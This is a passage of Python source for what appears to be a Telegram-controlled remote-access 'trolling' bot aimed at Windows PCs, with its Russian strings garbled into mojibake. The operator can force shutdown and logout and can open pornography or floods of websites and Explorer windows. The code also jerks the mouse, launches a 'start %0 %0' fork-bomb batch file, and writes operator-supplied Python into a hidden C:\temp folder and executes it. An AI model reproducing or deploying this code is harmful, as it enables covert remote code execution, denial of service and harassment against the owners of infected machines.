        elif message.text.strip() == 'SAMP —Ñ—É–Ω–∫—Ü–∏–∏':
            samp_menu(message)

        else:
            bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
            mainmenu(message)





def other_functions(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("–£–¥–∞–ª–µ–Ω–∏–µ –ø–∞–ø–∫–∏ —Å–æ —Å–∫—Ä–∏–ø—Ç–æ–º")
        item1=types.KeyboardButton("–í—ã—Ö–æ–¥ –∏–∑ —Å–∫—Ä–∏–ø—Ç–∞")
        item2=types.KeyboardButton("–í—ã–∑—ã–≤–∞—Ç—å BSOD")
        item3=types.KeyboardButton("–í—ã—Ö–æ–¥ –∏–∑ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏")
        item4=types.KeyboardButton("–ù–∞–∑–∞–¥")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        bot.send_message(message.chat.id, 'üîë *–í—ã–±–µ—Ä–∏—Ç–µ –Ω—É–∂–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, check_other)


def check_other(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '–£–¥–∞–ª–µ–Ω–∏–µ –ø–∞–ø–∫–∏ —Å–æ —Å–∫—Ä–∏–ø—Ç–æ–º':
            full_delete(message)

        elif message.text.strip() == '–í—ã—Ö–æ–¥ –∏–∑ —Å–∫—Ä–∏–ø—Ç–∞':
            script_exit(message)

        elif message.text.strip() == '–ù–∞–∑–∞–¥':
            mainmenu(message)

        elif message.text.strip() == '–í—ã—Ö–æ–¥ –∏–∑ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏':
            logout(message)

        elif message.text.strip() == '–í—ã–∑—ã–≤–∞—Ç—å BSOD':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("–î–∞, –∫–æ–Ω–µ—á–Ω–æ")
            item1=types.KeyboardButton("–ù–µ—Ç, —è –ø–µ—Ä–µ–¥—É–º–∞–ª")
            markup.add(item0)
            markup.add(item1)
            bot.send_message(message.chat.id, '‚ùå *–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–∑–≤–∞—Ç—å BSOD?*', parse_mode='Markdown', reply_markup=markup)
            bot.register_next_step_handler(message, bsod)

        elif message.text.strip() == '/start':
            start(message)

        else:
            bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
            other_functions(message)





def logout(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, '‚òëÔ∏è *–í—ã –≤—ã—à–ª–∏ –∏–∑ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏*', parse_mode='Markdown')
        return subprocess.run('shutdown /l')





def script_exit(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("–î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é")
        item1=types.KeyboardButton("–ù–µ—Ç, —è –ø–µ—Ä–µ–¥—É–º–∞–ª")
        markup.add(item0)
        markup.add(item1)
        bot.send_message(message.chat.id, 'üò¢ *–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤—ã—Ö–æ–¥!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, check_exit)

def check_exit(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '–î–∞, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é':
            bot.send_message(message.chat.id, 'üò• *–í—ã –∑–∞–≤–µ—Ä—à–∏–ª–∏ —Ä–∞–±–æ—Ç—É —Å–∫—Ä–∏–ø—Ç–∞!*', parse_mode='Markdown')
            os.abort()

        elif message.text.strip() == '–ù–µ—Ç, —è –ø–µ—Ä–µ–¥—É–º–∞–ª':
            other_functions(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            other_functions(message)





def packs(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("–í—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö")
        item1=types.KeyboardButton("–û—Ç–∫—Ä—ã—Ç—å –ø–æ—Ä–Ω–æ")
        item2=types.KeyboardButton("–ú–∞—Å—Å–æ–≤–æ–µ –æ—Ç–∫—Ä—ã—Ç–∏–µ —Å–∞–π—Ç–æ–≤")
        item3=types.KeyboardButton("–ú–∞—Å—Å–æ–≤–æ–µ –æ—Ç–∫—Ä—ã—Ç–∏–µ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞")
        item4=types.KeyboardButton("–ú–∞—Å—Å–æ–≤–æ–µ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –º—ã—à–∫–∏")
        item5=types.KeyboardButton("start %0 %0")
        item6=types.KeyboardButton("–ù–∞–∑–∞–¥")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        markup.add(item5)
        markup.add(item6)

        bot.send_message(message.chat.id, 'üë∫ *–í—ã –≤ –º–µ–Ω—é —Ç—Ä–æ–ª–ª–∏–Ω–≥–∞!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, check_packs)

def check_packs(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '–í—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö':
            bot.send_message(message.chat.id, '‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ —Ñ—É–Ω–∫—Ü–∏—é –≤—ã–∫–ª—é—á–µ–Ω–∏—è –ü–ö!*', parse_mode='Markdown')
            os.system('chcp 1251')
            os.system('shutdown /s /t 0')
            packs(message)
        
        elif message.text.strip() == '–û—Ç–∫—Ä—ã—Ç—å –ø–æ—Ä–Ω–æ':
            whatopen = 'http://xvideos.com'
            webbrowser.open(str(whatopen), new=1)
            bot.send_message(message.chat.id, '‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ —Ñ—É–Ω–∫—Ü–∏—é –æ—Ç–∫—Ä—ã—Ç–∏—è –ø–æ—Ä–Ω–æ!*', parse_mode='Markdown')
            packs(message)

        elif message.text.strip() == '/start':
            start(message)
        
        elif message.text.strip() == '–ù–∞–∑–∞–¥':
            mainmenu(message)

        elif message.text.strip() == 'start %0 %0':
            my_file = open("troll.bat", "w", encoding="utf-8")
            my_file.write('start %0 %0')
            my_file.close()

            os.startfile("troll.bat")
            bot.send_message(message.chat.id, '‚òëÔ∏è *Start %0 %0 —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!*', parse_mode='Markdown')
            packs(message)

        elif message.text.strip() == '–ú–∞—Å—Å–æ–≤–æ–µ –æ—Ç–∫—Ä—ã—Ç–∏–µ —Å–∞–π—Ç–æ–≤':
            bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ —Ä–∞–∑ –≤—ã —Ö–æ—Ç–∏—Ç–µ –æ—Ç–∫—Ä—ã—Ç—å —Å–∞–π—Ç—ã!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, troll_site)

        elif message.text.strip() == '–ú–∞—Å—Å–æ–≤–æ–µ –æ—Ç–∫—Ä—ã—Ç–∏–µ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞':
            bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ —Ä–∞–∑ –≤—ã —Ö–æ—Ç–∏—Ç–µ –æ—Ç–∫—Ä—ã—Ç—å –ø—Ä–æ–≤–æ–¥–Ω–∏–∫!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, troll_provod)

        elif message.text.strip() == '–ú–∞—Å—Å–æ–≤–æ–µ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –º—ã—à–∫–∏':
            bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ —Å–µ–∫—É–Ω–¥ –≤—ã —Ö–æ—Ç–∏—Ç–µ –ø–µ—Ä–µ–º–µ—â–∞—Ç—å –º—ã—à—å!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, mouse_troll)

        else:
            bot.send_message(message.chat.id, '‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É*', parse_mode='Markdown')
            packs(message)





def mouse_troll(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        xmouse = message.text.strip()

        if str(xmouse) == "/start":
            start(message)

        else:
            bot.send_message(message.chat.id, f'‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ –Ω–∞—á–∞–ª –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è {xmouse} —Å–µ–∫—É–Ω–¥!*', parse_mode='Markdown')
            packs(message)

            for i in range(int(xmouse)):
                pyautogui.moveTo(147, 154, duration=0.10)
                pyautogui.moveTo(325, 635, duration=0.10)
                pyautogui.moveTo(500, 489, duration=0.10)
                pyautogui.moveTo(1299, 963, duration=0.10)
                pyautogui.moveTo(327, 655, duration=0.10)
                pyautogui.moveTo(798, 655, duration=0.10)
                pyautogui.moveTo(25, 752, duration=0.10)
                pyautogui.moveTo(1058, 162, duration=0.10)
                pyautogui.moveTo(1263, 825, duration=0.10)
                pyautogui.moveTo(558, 265, duration=0.10)

            else:
                bot.send_message(message.chat.id, '‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç –Ω–∞ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –º—ã—à–∫–∏ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è!*', parse_mode='Markdown')





def troll_provod(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        xprovod = message.text.strip()

        if str(xprovod) == "/start":
            start(message)

        else:
            bot.send_message(message.chat.id, f'‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ –Ω–∞—á–∞–ª –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è {xprovod} —Ä–∞–∑!*', parse_mode='Markdown')
            packs(message)

            for i in range(int(xprovod)):
                keyboard.send("win+e")

            else:
                bot.send_message(message.chat.id, '‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç –Ω–∞ –æ—Ç–∫—Ä—ã—Ç–∏–µ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è!*', parse_mode='Markdown')





def troll_site(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        xsite = message.text.strip()

        if str(xsite) == "/start":
            start(message)

        else:
            bot.send_message(message.chat.id, f'‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ –Ω–∞—á–∞–ª –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è {xsite} —Ä–∞–∑!*', parse_mode='Markdown')
            packs(message)

            for i in range(int(xsite)):
                webbrowser.open('https://dzen.ru', new = 1)
                webbrowser.open('https://youtube.com', new = 1)
                webbrowser.open('https://www.google.com', new = 1)
                webbrowser.open('https://yandex.ru', new = 1)
                webbrowser.open('https://edu.gounn.ru', new = 1)
                            
            else:
                bot.send_message(message.chat.id, '‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç –Ω–∞ –æ—Ç–∫—Ä—ã—Ç–∏–µ —Å–∞–π—Ç–æ–≤ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è!*', parse_mode='Markdown')


def full_delete(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, f"import shutil\n\nshutil.rmtree('{os.path.abspath(os.curdir)}')")
        bot.register_next_step_handler(message, full_delete_open)


def full_delete_open(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        text = message.text.strip()

        if os.path.exists('C:\\temp') == False:
            fileName = r'C:\temp'
            os.mkdir(fileName)
            kernel32 = ctypes.windll.kernel32
            attr = kernel32.GetFileAttributesW(fileName)
            kernel32.SetFileAttributesW(fileName, attr | 2)

        if str(text) == "/start":
            start(message)

        else:
            my_file = open("C:\\temp\\DeleteFile.py", "w", encoding="utf-8")
            my_file.write(str(text))
            my_file.close()

            os.system("python C:\\temp\\DeleteFile.py")
            other_functions(message)



if __name__ == '__main__':
    bot.infinity_polling(none_stop = True)